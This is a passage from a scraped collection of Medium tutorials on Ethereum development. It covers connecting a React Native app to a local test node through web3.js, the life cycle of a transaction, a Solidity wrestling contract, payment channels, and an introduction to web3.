v4.1.3TLDR; Of course you can just grab the code and skip all the details if you wish. The source can be found at: https://github.com/gonetwork-project/mobile-dev-tutorials.We won\u2019t be running an Ethereum node on our mobile device, if you\u2019re looking details for that, check out : https://github.com/ethereum/go-ethereum/wiki/Mobile:-Introduction.Instead we will opt for methods inspired by status-im team and the work of https://github.com/alinz/react-native-webview-bridge.Our goal for this tutorial will be creating a simple react-native iOS app that connects to a local test Ethereum node and returns a set of Accounts. Here\u2019s a crude picture of our iOS code architecture:iOS code architecture, kitten not includedMy personal experience with create-react-native-app results in issues: https://github.com/facebook/react-native/issues/14246 , so I opt to use react-native init tutorial_1react-native run-ios //confirm we can buildNow that you confirmed your app runs and builds lets get a simple webpage that loads web3.js and connects to local ethereum test node going. From the root directory runbower install web3This creates a folder which packages web3.js and all its dependencies:./bower_componentscreate a directory ./html and a file called ./html/web3.html and copy and paste the code below:<html><head><title>Here are the accounts from test rpc</title></head><body><div>  <h1>Accounts from TestRPC</h1>  <ul id=\"accounts\">  </ul></div><script type=\"text/javascript\" src=\"../bower_components/web3/dist/web3.min.js\"></script><script type=\"text/javascript\">  /** * Sample Web3html * https://github.com/facebook/react-native * @flow * Author: Amit Shah */var provider =   new Web3.providers.HttpProvider(\"http://localhost:8545\");if (!('toJSON' in Error.prototype))      Object.defineProperty(Error.prototype, 'toJSON', {          value: function () {              var alt = {};Object.getOwnPropertyNames(this).forEach(function (key) {                  alt[key] = this[key];              }, this);              alt['ERROR'] = 1;              return alt;          },          configurable: true,          writable: true  });  CallbackHandler = function(data){    alert(JSON.stringify(data));  }// var web3 = new Web3(new Web3.providers.HttpProvider(\"http://192.168.0.16:8545\"));  var web3 = new Web3(provider);  function GetAccounts(){  if(web3){      try      {        var accounts = web3.eth.accounts;        return accounts;      }catch(e){        CallbackHandler(e);      }}else{      CallbackHandler(\"ERROR, NO WEB3.JS CONTEXT\");    }    return [];  }var accounts = GetAccounts();  for(var i=0; i < accounts.length; i++){    var node = document.createElement(\"LI\");    var textnode = document.createTextNode(accounts[i]);    node.appendChild(textnode);    document.getElementById(\"accounts\").appendChild(node);}</script></body></html>Lets test web3.html. Move to the command line and start testrpc. This starts a test Ethereum node with rpc enabled at http://localhost:8545. Now open chrome and navigate to web3.html. When the page loads you should see something like this:i took up a lot of room to show your test accountsGreat, you have a very simple webpage that connects to your local Ethereum node. Now lets wire this to iOS. Lets first download and install the webview-bridge.cd ./node_modulesgit clone https://github.com/gonetwork-project/react-native-webview-bridge.gitcd..react-native linkreact-native run-ios If compilation fails you may have to clean and build the project from XcodeOpen Xcode, open $TUTORIAL_ROOT/ios/tutorial_1.xcodeprojRun clean and build. After successful build, move back over to the command line and retry react-native run-ios. With successful compilation we can move on to updating App.js. Copy and paste the code from below and we will examine the various code blocks:/** * Sample React Native App * https://github.com/facebook/react-native * @flow */import React, { Component } from 'react';import {  Platform,  StyleSheet,  Text,  View,  Button} from 'react-native';import WebViewBridge from 'react-native-webview-bridge';const injectScript = `  (function () {    //https://stackoverflow.com/questions/18391212/is-it-not-possible-to-stringify-an-error-using-json-stringifyCallbackHandler=function(result){        //marshall the data        if(WebViewBridge){          WebViewBridge.send(JSON.stringify(result));        }    }    if (WebViewBridge) {WebViewBridge.onMessage = function(message){          try{            if(message === \"get_accounts\"){              var accounts = GetAccounts();              CallbackHandler({result:accounts});            }          }catch(e){            CallbackHandler(e);          }      }    }}());`;//we will need this for futre workvar WVB_GLOBAL = null;export default class App extends Component<{}> {  onBridgeMessage(message) {    try{      if (this.refs['webviewbridge'] !== null) {        var msg = JSON.parse(message);        var accounts = msg.result;        alert(\"react-native accounts array:\"+accounts);        }    }catch(err){}  }onButtonPress(){    this.webviewbridge.sendToBridge(\"get_accounts\");}  render() {    return (      <View style={styles.container}>        <Text style={styles.welcome}>          Welcome to React Native!        </Text>        <Text style={styles.instructions}>          To get started, edit App.js        </Text>        <WebViewBridge              ref={(ref) => {this.webviewbridge = ref; WVB_GLOBAL = ref;}}              onBridgeMessage={(m) => this.onBridgeMessage(m)}              javaScriptEnabled={true}              injectedJavaScript={injectScript}              // If you run android, sorry you gotta deal with some local file stuff :()              //source={() =>              //   Platform.OS === 'ios' ? require('./html/web3.html') :              //     { uri: 'file:///android_asset/path-to/the-linked-file.html' }}              source={require('./html/web3.html')}              style={styles.webview} />        <Button          onPress={() => this.onButtonPress()}          title=\"Get Accounts\"          color=\"#841584\"          accessibilityLabel=\"Learn more about this purple button\"        /></View>);  }}const styles = StyleSheet.create({  container: {    flex: 1,    justifyContent: 'center',    alignItems: 'center',    backgroundColor: '#F5FCFF',  },  welcome: {    fontSize: 20,    textAlign: 'center',    margin: 10,  },  instructions: {    textAlign: 'center',    color: '#333333',    marginBottom: 5,  },   webview: {    marginTop: 20,    maxHeight: 200,    width: 320,    flex: 1  },});Lets go through some interesting parts of this code. Firstly, we add the WebViewBridge into our render function:<WebViewBridge              ref={(ref) => {this.webviewbridge = ref; WVB_GLOBAL = ref;}}              onBridgeMessage={(m) => this.onBridgeMessage(m)}              javaScriptEnabled={true}              injectedJavaScript={injectScript}              // If you run android, sorry you gotta deal with some local file stuff :()              //source={() =>              //   Platform.OS === 'ios' ? require('./html/web3.html') :              //     { uri: 'file:///android_asset/path-to/the-linked-file.html' }}              source={require('./html/web3.html')}              style={styles.webview} />Interesting things to note:We define a callback onBridgeMessage that will respond to information sent from web3.htmlWe define a property this.webviewbridge using react-natives ref propsWe inject javascript with injectedJavascriptProperty. The javascript code will help us marshal messages between react-native and web3.htmlWe simply require('./html/web3.html') source. This has only been tested for iOS, android is known to have some issues referencing local files in a webview.Lets take a look at injectScriptconst injectScript = `  (function () {    //https://stackoverflow.com/questions/18391212/is-it-not-possible-to-stringify-an-error-using-json-stringifyCallbackHandler=function(result){        //marshall the data        if(WebViewBridge){          WebViewBridge.send(JSON.stringify(result));        }    }    if (WebViewBridge) {WebViewBridge.onMessage = function(message){          try{            if(message === \"get_accounts\"){              var accounts = GetAccounts();              CallbackHandler({result:accounts});            }          }catch(e){            CallbackHandler(e);          }      }    }}());`;This script is appended to web3.html and redefines the CallbackHandler in web3.html. The redefined CallbackHandler will callJSON.stringifyon our account data before sending it back to react-native.When that process happens, onBridgeMessage is invoked as a callback from react-native. If you press the \u201cGet Accounts\u201d button, you should see an alert modal pop up and list the very same accounts that were rendered in the web3.html test view.And there you have it! You have just completed connecting to a local Ethereum node with react native. This is the very foundation of the next series of tutorials which will cover the following topics:creating and sending off-chain signed transactionsCreating and compiling contracts with truffle and interacting with them in react-nativebuilding a simple bluetooth tap-and-pay componentStay Tuned and feel free to leave comments and feedback.Thanks to @digital_abyss for proofread", "responses": 20, "tags": ["Ethereum", "iOS", "Solidity", "React Native", "Hackathons"]}, {"title": "Life Cycle of an Ethereum Transaction", "post_link": "https://medium.com/blockchannel/life-cycle-of-an-ethereum-transaction-e5c66bae0f6e?source=search_post", "author_name": "Mahesh Murthy", "author_link": "https://medium.com/@mvmurthy", "publish_date": "2017-12-26", "last_modified_date": "2018-06-21", "readtime": "8.74", "claps": 3851, "voters": 524, "content": "Life Cycle of an Ethereum TransactionLearn How an Ethereum Transaction is Created and Propagated to the NetworkMahesh MurthyFollowDec 26, 2017 \u00b7 9 min readTransactions are at the heart of the Ethereum blockchain (or any blockchain for that matter). When you interact with the Ethereum blockchain, you are executing transactions and updating it\u2019s state. Have you ever wondered what exactly happens when you execute a transaction in Ethereum? Let\u2019s try to understand it by looking at an example transaction. In this post, we will cover the following.An end to end traversal of an Ethereum transaction starting from your browser/console to the Ethereum network and back to your browser/consoleUnderstand how transactions work when you use a plugin such as Metamask or Myetherwallet instead of running your own nodeWhat to do if you are too paranoid and don\u2019t trust any plugins to execute your transaction?This post assumes that you have a basic understanding of Ethereum and it\u2019s components such as accounts, gas and contracts. Here is a good explanation of these concepts. If you are a developer new to Ethereum, you might find this helpful. You can also learn to build a simple dapp here. This post will make more sense if you have executed few transactions yourself. An example of a transaction is you sending some ether to another person or a contract. Another example is if you have interacted with a dapp. For example, if you go here and buy some tokens, that would be a transaction. If you vote for a candidate, that would be another transaction.1. End to end overview of an Ethereum transactionLet\u2019s take the following contract call as an example and traverse through the entire flow of how this function call/transaction gets executed and gets permanently stored on the blockchain. You can find the entire contract here. At a high level, it\u2019s a voting contract where you initialize a few candidates contesting in an election and anyone can vote for them. The votes will be recorded on the blockchain.Voting.deployed().then(function(instance) {  instance.voteForCandidate('Nick', {gas: 140000, from: web3.eth.accounts[0]}).then(function(r) {    console.log(\"Voted successfully!\")  })})We assume that you have an Ethereum client (Geth or Parity) running locally on your computer which is connected to one of the networks (Testnet or Mainnet) and you have access to the contract address and ABI to execute the transaction.If you have built a dapp, the above code should look familiar. There is a contract called Voting which has already been deployed on to the blockchain. We instantiate that contract and execute a method called voteForCandidate and pass in the candidate name, gas limit for this transaction and the account that executes this transaction. As the name indicates, this function is used to vote for a candidate and the vote is recorded on the blockchain. Below we will try to deconstruct this call and understand everything that happens when you execute this javascript function.1. Construct the raw transaction objectThe voteForCandidate function call is first converted in to a raw transaction (rawTxn) as shown below. Web3js library is used to build the raw transaction object.txnCount = web3.eth.getTransactionCount(web3.eth.accounts[0])var rawTxn = {    nonce: web3.toHex(txnCount),    gasPrice: web3.toHex(100000000000),    gasLimit: web3.toHex(140000),    to: '0x633296baebc20f33ac2e1c1b105d7cd1f6a0718b',    value: web3.toHex(0),    data: '0xcc9ab24952616d6100000000000000000000000000000000000000000000000000000000'};Let\u2019s try to understand all the fields in the raw transaction object and how they are set.nonce: Each Ethereum account has a field called nonce to keep track of the total number of transactions that account has executed. Nonce is incremented for every new transaction and this allows the network to know the order in which the transactions need to be executed. Nonce is also used for the replay protection.gasPrice: Price per unit of gas you are willing to pay for this transaction. If you are executing your transaction on the Mainnet, here is a handy website from ETH Gas Station that recommends what you should set the gas price for your transaction to succeed in a reasonable amount of time. Gas prices are current measured in GWei and range from 0.1->100+Gwei. You will learn more about gas price and it\u2019s impact later in this article.gasLimit: Maximum gas you are willing to pay for this transaction. This value insures that in case of an issue executing your transaction (like infinite loop), you account is not drained of all the funds. Once the transaction is executed, any remaining gas is sent back to your account.to: The address to which you are directing this function call. This is the contract address (0x633296baebc20f33ac2e1c1b105d7cd1f6a0718b) of the Voting contract in our case.value: Total Ether you want to send. When we executevoteForCandidate, we are not sending any Ether and so the value is 0. If you were executing a transaction to send Ether to another person or a contract, you would set this value.data: Let\u2019s see how this data field is calculated.You first take the function signature from the ABI voteForCandidate(bytes32)and generate the hash of it.> web3.sha3('voteForCandidate(bytes32)')'0xcc9ab267dda32b80892b2ae9e21b782dbf5562ef3e8919fc17cab72aa7db9d59'You take the first 4 bytes of that hash. So, that would be: 0xcc9ab267.You then take the argument \u2018Nick\u2019 and convert to bytes32 and you get 52616d6100000000000000000000000000000000000000000000000000000000You combine the two to get the data payload.2. Sign the TransactionIf you remember, you used web3.eth.accounts[0] to execute the transaction. The Ethereum network needs to know that you actually own that account to make sure someone else doesn\u2019t execute this transaction on your behalf. The way to prove this to the network is by signing the transaction using the private key corresponding to that account. The signed transaction looks like this:const privateKey = Buffer.from('e331b6d69882b4ab4ea581s88e0b6s4039a3de5967d88dfdcffdd2270c0fd109', 'hex')const txn = new EthereumTx(rawTxn)txn.sign(privateKey)const serializedTxn = txn.serialize()3. Transaction is validated locallyThe signed transaction is submitted to your local Ethereum node. You local node will then validate the signed transaction to make sure that it was really signed by this account address.4. Transaction is broadcast to the networkThe signed transaction is broadcast by your geth/parity node to it\u2019s peers who in turn broadcast to their peers and so on. Once the transaction is broadcast to the network, your local node also outputs the transaction id which you can use to track the status of your transaction. This transaction id is just the hash of the signed transaction object.transactionId = sha3(serializedTxn)If you execute the transaction on a public Ethereum network, the best way to track the status of your transaction is on etherscan.io. In the picture above, if you notice there are a couple of nodes marked as Etherscan nodes. The folks at Etherscan run a few nodes and they have a nice frontend webapp connected to it. When your transaction is picked up by their nodes, you can see your pending transaction on their website.One other thing to remember is, not all nodes will accept your transaction. Some of these nodes might have a setting to accept only transactions with certain minimum gas price. If you have set a gas price lower than that limit, that node will just ignore your transaction.5. Miner Node accepts the transactionAs you can see in the picture, the Ethereum network has a mix of miner nodes and the non miner nodes. As you probably know, the miners are the ones who do the job of including your transaction in the block. Miners maintain a transaction pool where your transaction gets added to before they start evaluating it.If you notice the picture above, the miners store all the transactions in the pool sorted by gas price. The higher the gas price, the more likely the transaction is included in the next block. This is the common configuration for a miner node (to optimize for higher pay). However, a miner can configure her node to sort the transactions however they like (say they want to help the network by mining only low gas transactions).In the picture above, you see how our voteForCandidate transaction is at the bottom of the miner\u2019s pool? Once all the high gas fee transactions have been mined and included in the block, the miners will work our transaction.One other thing to note is, the miner\u2019s pool can hold a finite number of transactions. Let\u2019s say there is a hot ICO sale going on or a really popular dapp (like Crypto Kitties) takes off . People submit their transactions with high gas price hoping that the miners pick up their transaction before any other transactions. If higher gas price transactions fill up the pool, your low price transaction is discarded. There is no hope for our candidate Nick to receive any vote for a while. We might even have to rebroadcast the transaction in such cases.Another trick to bump your transaction up the pool is to resubmit your transaction with a higher gas price but using the same nonce value. That way, when the new transaction is received by the miners, the new higher gas price transaction overwrites your old transaction. If the nonce value is different, it is considered a different transaction (You will end up casting 2 votes to Nick). Here is an excellent article from Jim McDonald explaining this topic in depth.6. Miner Node finds a valid block and broadcasts to the networkThe miner eventually picks our transaction to include in the block along with other transactions. The miner can only pick so many transactions to include in the block because Ethereum has set a block gas limit. i.e, the sum of all the gas limits on the transactions can not exceed the block gas limit. You can see the current gas limit at ethstats.net.Once the miners select the transactions to include in the block, the transactions are validated and included in a pending block and the Proof of Work begins. One of the miner nodes eventually finds a valid block (by solving the PoW puzzle) and adds that block to the blockchain. Just like the raw transaction was broadcast by your local node which was received by all other nodes, the miner node broadcasts this valid block to other nodes.7. Local Node receives/syncs the new blockEventually your local node will receive this new block and syncs it\u2019s local copy of the blockchain. Upon receiving the new block, the local node executes all the transactions in the block.If you use truffle to execute your transaction, truffle constantly polls the blockchain for confirmation. Once it sees the transaction is confirmed, it executes the code inside the then() block and prints the console log (per our example).2. Using Metamask instead of the local nodeIf you install the MetaMask browser plugin, you can manage your accounts in your browser. The keys are stored only on your browser, so you are the only one who has access to your account and the private key. When you execute a transaction in your browser, the plugin takes care of converting your function call in to a raw transaction and sign the transaction using your private key. Metamask runs their own nodes which they use to broadcast your transaction (Behind the scenes Metamask uses nodes hosted by Infura). This way, you don\u2019t even have to run your own Ethereum node.3. Offline signingWhat if you are not comfortable using a plugin or if you are worried that your local geth node might be compromised? There is a secure solution to solve that issue.If you notice, the first 2 steps don\u2019t require you to be online at all. If you want to absolutely make sure your transaction isn\u2019t tampered with, you can use a computer which is offline to convert the function call in to a raw transaction and use your private key to sign the transaction. You can then copy the signed transaction string and use a computer that is online to broadcast it to the network. There are many services like Etherscan and Infura you can use to broadcast your signed transaction to the network.Another safe solution is to use a hardware wallet such as Ledger or Trezor. These wallets store your private key and the code to sign the transaction is programmed in to the hardware itself. They need to be connected to the internet only to publish your signed transaction.Hopefully this gave you a better idea of how Ethereum transactions work. If you find something incorrect in the post, please leave a comment and I will fix it.Thanks Jim McDonald for proofreading this article.Self promotion: If you are interested in learning to build Ethereum dapps, check out my site zastrin.com!", "responses": 39, "tags": ["Ethereum", "Solidity", "Cryptography", "Development", "Decentralization"]}, {"title": "Ethereum Development Walkthrough (Part 1: Smart contracts)", "post_link": "https://medium.com/hackernoon/ethereum-development-walkthrough-part-1-smart-contracts-b3979e6e573e?source=search_post", "author_name": "dev_zl", "author_link": "https://medium.com/@dev_zl", "publish_date": "2018-01-14", "last_modified_date": "2019-04-29", "readtime": "7.06", "claps": 2059, "voters": 379, "content": "Ethereum Development Walkthrough (Part 1: Smart contracts)dev_zlFollowJan 14, 2018 \u00b7 8 min readSmart contracts, ICOs, Mist, Metamask, Remix, geth, web3.. You\u2019ve probably seen it all if you spent a little time trying to get into the world of Ethereum developement.Some deploy smart contracts to a test network, others tell you to read a yellow paper, while others advise you to use the truffle suite because it\u2019s great. And you are there, not knowing what exactly to do and how everything works together.If this is the first article that you read on Ethereum or the blockchain eco-system in general, you are going to love it! Experts calling each others names on twitter, unsafe standards and protocols, untested and buggy development tools. Not everything is figured out yet, everyone is going in different directions, and there still a lot to be done. The future of institutions, banks, and governments is being decided by mad developers! It\u2019s so great.Anyway, don\u2019t worry anymore, I\u2019ll try to connect all the dots for you in this tutorial series, and walk you through the universe of Smart contracts and dapps developement, and show you how everything fits together.While I will not get into every detail, I\u2019ll link some materials that will help you understand some concepts better, and it\u2019s up to you to research them and get into all the little details. The goal of this series is to help you understand better how things work together, in the simplest way possible, like a friend would explain it to you.I don\u2019t even know what Ethereum isThe official website of Ethereum tells us this:Ethereum is a decentralized platform that runs smart contracts: applications that run exactly as programmed without any possibility of downtime, censorship, fraud or third-party interference.In other words, it uses the capabilities that gives us the blockchain technology to certify the execution of the code that we run.If you don\u2019t know what the blockchain, Ethereum, Bitcoin, cryptocurrency or any of these words mean, I advise you to listen to this excellent podcast by Tim Ferriss, interviewing Nick Szabo and Naval Ravikant: The Quiet Master of Cryptocurrency \u2014 Nick SzaboWhat are Smart Contracts?On Ethereum, Smart Contracts are scripts that can handle money. It\u2019s as simple as that.These contracts are enforced and certified by parties that we call miners. Miners are multiple computers who add a transaction (Execution of a smart contract, payment of a cryptocurrency etc.) to a public ledger that we call a block. Multiple blocks constitute a blockchain.We pay these miners with something called Gas, which is the cost to run a contract. When you publish a smart contract, or execute a function of a smart contract, or transfer money to another account, you pay some ether that gets converted into gas.If it\u2019s still unclear, or you want to know more details, here are some interesting links:A different introduction to Smart Contracts in video.Smart contracts page on Wikipedia.A more detailed explanation of Gas.Before diving into smart contracts developmentIn this tutorial, I\u2019ll assume that you already have some basis in software development, and have a basic knowledge of Javascript and Node.JS. Otherwise, you\u2019ll be quickly lost. Solidity, the programming language that we will use to develop, is close to Javascript\u2019s syntax, and since a lot of development tools around Ethereum are based on Javascript and NodeJS, it will be easier for you to get in if you are already comfortable with both. This is not a tutorial for beginners, and while I\u2019ll link some alternative tutorials for you if you didn\u2019t understand some concepts, it\u2019s up to you to research the rest.Smart contracts developmentNow, finally, we start the interesting part, as I said Solidity is close to Javascript, but they are not alike. On Solidity, and I\u2019m sorry to tell you that, frontend developer, you just can\u2019t slap JQuery on a piece of code and hope that it will work, you can\u2019t overlook security, and you just can\u2019t hack your way through. We will see why when we will discuss security, development patterns, and fail-proofing our code.Now, for our first example, I\u2019m thinking about a script inspired by the movie In Time, where, in a dystopian future, people trade their remaining time to live like money. In the movie, they have a variant of arm wrestling that involves playing with that time, and we will do just that! Wrestling money using a Smart Contract.And don\u2019t worry, I\u2019ll make available for you all the scripts we will see on Github.Also, if it\u2019s the first time you deal with smart contracts, it\u2019s fine if you don\u2019t understand everything now, it takes practice, reading the docs, and a bit of research to get accustomed to Solidity.The codeNow, onto the coding, first of all, the base of a Solidity script is the following snippet, the pragma directive to tell the compiler which version of Solidity we are using, and the name of our contract, a similar structure to a class in Javascript. Here it\u2019s \u201cWrestling\u201d.We want two wrestlers, so we will add two variables that hold the address of their accounts (Public keys of their wallets).In our little game, in each round, the wrestlers will be able to put in a sum of money, and if one put in double the money of the other(in total), he will win.One important thing about the public/private keywords is, even though, a variable is private, it doesn\u2019t mean that someone couldn\u2019t read its content, it just means that it can be accessed only inside the contract, but in reality, since the whole blockchain is stored on a lot of computers, the information that is stored inside the variable could always be seen by others, and that represents the first security consideration that you should keep in mind.On the other hand, the compiler automatically creates getter functions for public variables. To make it possible for other contracts or users to change the value of the public variable, you need to create a setter function.Now we will add three events, for every step of our game. The beginning, when the wrestlers register, during the game, for each round, and at the end, when a wrestler wins. Events are simply logs, and they can be used to call JavaScript callbacks in the user interface of distributed applications, also known as dapps. Events can even be used for debugging purposes during development since there is no equivalent to the \u201cconsole.log()\u201d function of JavaScript on Solidity.Now we will add the constructor, in Solidity, it has the same name as our contract and it will be called only once, upon the creation of the contract.Here, the first wrestler will be the one who created the contract. \u201cmsg.sender\u201d is the address of the one who invoked the function.Next we let another wrestler register with the following function:The require function is a special error-handling function within Solidity that will revert changes if a condition is not met. In our example, if the variable wrestler2 equals the 0x0 address (the equivalent of 0 for addresses), we can proceed, if the address wrestler2 is different from the 0x0 address, it means that a player has already registered as an opponent, and therefore, we will refuse new registrations.Again, \u201cmsg.sender\u201d is the address of the account that called the function, and we emit an event that signals the start of the wrestling.Now, every wrestler will call a function, \u201cwrestle()\u201d, putting in money. And if both have played, we see if one of them has won (our rule was that one of them have to put in double the cash of the other one). The \u201cpayable\u201d keyword means that the function can receive money, if it isn\u2019t set, the function will not accept ether. The \u201cmsg.value\u201d is the amount of ether that was sent to the contract.We then add the endOfGame(), and endOfRound() functions. The \u201cinternal\u201d keyword is the same as private, the only difference is that internal functions could be inherited by other contracts(since Solidity is similar to other object-oriented languages), while private functions cannot be inherited.Notice that we don\u2019t deliver the money to the winner directly, while in this case it\u2019s not that important, since the winner will take all the money off this contract, in other cases, when multiple users can withdraw ether off a contract, it\u2019s more secure to use a withdraw pattern, to avoid re-entrancy.It simply means, that if for example multiple users can withdraw money off a contract, one can simply call the withdraw function multiple times at once and get payed multiple times. So we need to write our withdraw function in such a manner that it will nullify the amount he should receive before proceeding to pay him.It looks like this:And that\u2019s it. You can find the whole snippet at the following link:devzl/ethereum-walkthrough-1ethereum-walkthrough-1 - Repository for the first part of the tutorial series on Ethereum, \"Ethereum development\u2026github.comUsing an IDECopy the snippet now, and open the Remix IDE in a new tab of your browser:You can use Remix directly on your browser, and it has a lot interesting functionalities that you could hardly find elsewhere at the moment.Click on the button \u201c+\u201d on the top left of the page and create a new file named \u201cWrestling.sol\u201d, then past the code that you can find in the github repo linked above:Finally some syntax highlighting. Github doesn\u2019t support Solidity .sol extension yet.On the right part of the page, you can find multiple interesting tabs such as the \u201cAnalysis\u201d one, that will show errors and recommendations. I leave you to discover this tool more. I wanted to show it to you, even though we will use other tools in the next part, the goal of this tutorial series, as I said before, is to connect the dots for you, and show you how things fit together, and it\u2019s up to you to decide whether or not you are at ease using an IDE on a browser. Invite you to read the docs of Remix if you do.Alternatively, you should start getting familiar with solidity by reading its docs.In the next part, we will see how to deploy the Smart Contract to two kinds of test networks, discover truffle, ganache, and geth, and how they can all fit together.If you liked this first part, you can find me on twitter @dev_zl.Part two can be found here.", "responses": 13, "tags": ["Ethereum", "Development", "Smart Contracts", "Solidity", "Blockchain"]}, {"title": "Ethereum Payment Channel in 50 Lines of Code", "post_link": "https://medium.com/@matthewdif/ethereum-payment-channel-in-50-lines-of-code-a94fad2704bc?source=search_post", "author_name": "Matthew Di Ferrante", "author_link": "https://medium.com/@matthewdif", "publish_date": "2017-06-05", "last_modified_date": "2018-06-18", "readtime": "3.01", "claps": 1350, "voters": 360, "content": "Ethereum Payment Channel in 50 Lines of CodeMatthew Di FerranteFollowJun 5, 2017 \u00b7 4 min readWith the talk of state/payment channels being a \u201cfuture\u201d scalability option in Ethereum, I wanted to write a contract to show that they\u2019re more than doable now. You don\u2019t need to wait for Raiden, you can set up your own trustless channels right now.I\u2019ll walk through the solidity code in channel.sol here: https://github.com/mattdf/payment-channelLet\u2019s say Alice and Bob want to set up a payment channel for something that requires micropayments that they don\u2019t want to commit on chain to save on transaction fees. In this case, Bob may be paying Alice to manage a social media presence, and he pays her 0.001 ETH per tweet(24 cents) \u2014 if Bob were to make an on-chain transaction for each tweet, 20% of Alice\u2019s income would be eaten up by fees.On one hand, Alice does not want to do 100 tweets of work and trust Bob will pay her at the end for all 100 tweets, and on the other hand, Bob doesn\u2019t want to pay Alice for 100 tweets all at once for her to just disappear and not do any work.We can solve this with a payment channel where Bob commits 100*0.001 = 0.1 ETH to the channel smart contract, where the money can only either go to Alice or back to Bob. We see the constructor here:Bob sends 0.1 ETH when creating the contract, and sets a timeout of 1 day, assuming the work will be done by then, or he can cancel the payment channel and return the funds to himself.Alice now sees that through the payment channel the funds are locked and begins tweeting. For each tweet, Bob signs a hash of (contract_address, value) with the private key he used to set up the channel, and sends it to Alice. So for the first tweet Bob signs (0x123\u2026, 0.001 ETH), for the second (0x123, 0.002 ETH), etc\u2026Each time Alice receives this, she also signs it but she does not send it to the blockchain. At any moment if Alice decides she has received enough and no longer needs to tweet, she can submit the multi-signed (by both Bob and Alice) message to the smart contract and the smart contract will send the agreed upon value to Alice (say, 0.05 ETH) and send the rest back to Bob.The function Alice can call to terminate the channel. Seeing as it requires both signatures, Bob cannot single-handedly close it and cheat Alice out of work she\u2019s already done.Because the function requires both signatures to successfully execute, neither Bob or Alice can run it without submitting a value they both signed (and hence agreed to).If Alice is malicious and wants to extort Bob once he\u2019s locked his funds, by not doing any work and saying she\u2019ll only sign a tx that sends her half the money \u2014 the timeout protects Bob in this scenario. He can simply wait for the day to end and he can call ChannelTimeout, which destroys the contracts and returns all funds back to him.Timeout function to protect Bob from being extortedAlso, because Bob never has Alice\u2019s signatures until they\u2019re submitted to the blockchain, he cannot close the channel in a way that cheats Alice out of money. If Alice sees Bob stops paying her, she can simply close the channel, receive her funds, and be done with it. This way, at most, Alice is only at risk of not being paid for 1 tweet \u2014 or losing out 24 cents. Neither party is at risk of more than 24 cents of loss, compared to 20 dollars in the non-payment channel example. They also both massively save in tx fees!That\u2019s it! This contract is enough for a payment channel between two individuals. Raiden and more complex setups enable multi-party channels that can be linked together, but you don\u2019t need to wait for that if you just want to use the simplest case now. Ethereum is already scalable with payment channels far more than Bitcoin, because it does not have tx malleability problems.", "responses": 23, "tags": ["Blockchain", "Ethereum", "Cryptocurrency", "Solidity"]}, {"title": "A Gentle Introduction to Ethereum Programming, Part 1", "post_link": "https://medium.com/zeppelin-blog/a-gentle-introduction-to-ethereum-programming-part-1-783cc7796094?source=search_post", "author_name": "Facu Spagnuolo", "author_link": "https://medium.com/@facuspagnuolo", "publish_date": "2017-11-14", "last_modified_date": "2019-02-13", "readtime": "5.44", "claps": 1615, "voters": 290, "content": "A Gentle Introduction to Ethereum Programming, Part 1Facu SpagnuoloFollowNov 14, 2017 \u00b7 6 min readTwo months ago I was asked to build an Ethereum web application as a work test to join Zeppelin, but I didn\u2019t have any idea about blockchain technology at all. I had barely heard of Bitcoin, so there was no other option but to dive in.This will be a series of posts aimed at software developers who want to ramp up to Ethereum. Please keep in mind that I do not consider myself an expert in this subject, I\u2019d just like to teach you what I learned and save you some time if you are in the same place I was. By the end of the series you should be able to build a fully-fledged smart-contract-enabled web application (also known as DApp) on your own!Enjoy, and please do not hesitate to reach out with questions, suggestions or feedback.Index1. Taking the first steps1.1. Introduction1.2. Web32. Interacting with a contract3. Frameworks & Tools in the real world4. A real DApp, a token marketplace \u2014 coming soon1. Taking the first steps1.1. IntroductionI\u2019ll assume you have some basic knowledge about computer programming and what a blockchain data structure looks like. If you don\u2019t, please follow this link and come back!EthereumLet\u2019s start by defining Ethereum, or at least, what I understood about it after my research. Ethereum is an open-source public platform, distributed and based on blockchain technology, to run applications without censorship or third-party interference.Smart ContractsSmart contracts are just computer programs. We build Ethereum applications based on smart contracts. Bear in mind that even though this concept comes up with Ethereum these days, it was actually proposed by Nick Szabo in 1996 :)Ethereum Virtual MachineThe EVM is the sandboxed runtime and completely isolated environment for smart contracts in Ethereum. This means every smart contract running inside the EVM has no access to network, file system or other processes.GasGiven that Ethereum is a distributed platform, there must be a way to limit the resources available to a given smart contract, otherwise it could starve the whole network\u2019s computing power. Gas solves that issue by fixing a cost for every instruction executed in the EVM. One important thing, is that every transaction is sent to the network with a \u201cgas budget\u201d. If it runs out, the transaction will fail but still gets mined into the blockchain.Ether (ETH)It is the Ethereum cryptocurrency token. There is a gas/Ether dynamic price that measures how much ETH will an operation cost. The fee paid to execute a transaction is calculated by multiplying the gas cost and the gas price (the resulting fee is paid in ETH). You can set the gas price for your transaction to any value. However, if the gas price is too low, no one is going to execute your code.AccountsEvery account is identified by an address. There are two kinds of accounts sharing the same address space. On one hand, we have external accounts controlled by public-private key pairs, commonly owned by people to store ETH. On the other hand, we have contract accounts that are controlled by the code that it\u2019s stored with it. These have a few differences, but one very important to have in mind, is that only external accounts can initiate transactions.TransactionsA transaction is a message sent from one account to another account. You can send a transaction to another external account in order to transfer ETH. If the target account is a contract account, its code will be executed as well. Note that every transaction that involves code execution will be executed on all nodes of the network. Furthermore, every code run, or transaction execution, will be recorded in the Ethereum blockchain.SoliditySolidity is a contract-oriented high-level language, with similar syntax to JavaScript. It is statically typed, supports inheritance, libraries and complex user-defined types. It compiles to EVM assembly, which is run by the nodes.1.2. Web3I decided to start interacting with the Ethereum blockchain, by first simply sending ETH from one account to another. I didn\u2019t want to do it with real ETH since I was probably going to make a mess, so I started looking for some testing/fake environment. Reading Manu\u2019s amazing post I found testrpc, that is a node.js Ethereum client for testing and development. Let\u2019s install it and start playing with it:npm install -g ethereumjs-testrpctestrpcYou will notice that testrpc has generated 10 addresses with fake ETH you can use without the need to worry about them. This is how testrpc works by default, but you can make a custom initialization following the documentation. It\u2019s important to mention that testrp state is volatile, that is every time you close it, the state of your node and accounts will be cleared.The next thing you should get to know is Web3.js. It is a JavaScript library that implements the Ethereum JSON RPC. That is, the protocol that we will use to talk to an Ethereum node (in this case, testrpc). To install it, just run:npm install -g web3@0.20.1BTW, it is important to install a Web3 0.20.x version, but not the 1.0.0 beta for this exercise. First of all, you need to connect Web3 with your local testing node you are running with testrpc. In order to do that, we will ask Web3 to use a localhost provider. Let\u2019s open a node console and input following lines:Web3 = require('web3')provider = new Web3.providers.HttpProvider(\"http://localhost:8545\")web3 = new Web3(provider)Please note that we are using the default testrpc port (8545), if you set another one remember to change the provider URL too. Once you have your web3 instance, start by getting the list of accounts you have in your Ethereum node, with their respective balance, by running the 